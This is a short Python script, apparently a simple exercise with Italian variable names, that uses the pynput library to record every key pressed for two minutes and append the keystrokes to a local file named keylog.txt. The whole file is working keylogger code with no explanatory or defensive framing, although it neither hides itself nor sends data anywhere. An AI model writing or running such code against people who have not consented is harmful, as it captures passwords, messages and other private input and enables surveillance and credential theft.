from pynput.keyboard import Listener
import time
def azioneh (key):
     with open("keylog.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f'[{key}]')
origlia= Listener(on_press=azioneh)
origlia.start()
time.sleep(120)
origlia.stop()